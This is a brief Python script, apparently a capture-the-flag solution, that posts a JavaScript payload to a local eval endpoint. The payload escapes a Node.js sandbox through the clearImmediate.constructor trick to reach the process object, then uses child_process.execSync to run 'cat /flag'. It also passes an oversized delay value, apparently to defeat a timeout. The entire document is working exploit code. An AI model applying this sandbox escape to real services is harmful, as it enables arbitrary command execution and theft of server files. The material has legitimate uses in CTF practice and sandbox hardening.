import requests

print(requests.post('http://localhost:8081/eval?delay=2147483649', data={
    'e': """(function () {
  const process = clearImmediate.constructor("return process;")();
  return process.mainModule.require("child_process").execSync("cat /flag").toString()
})()"""
    }).text)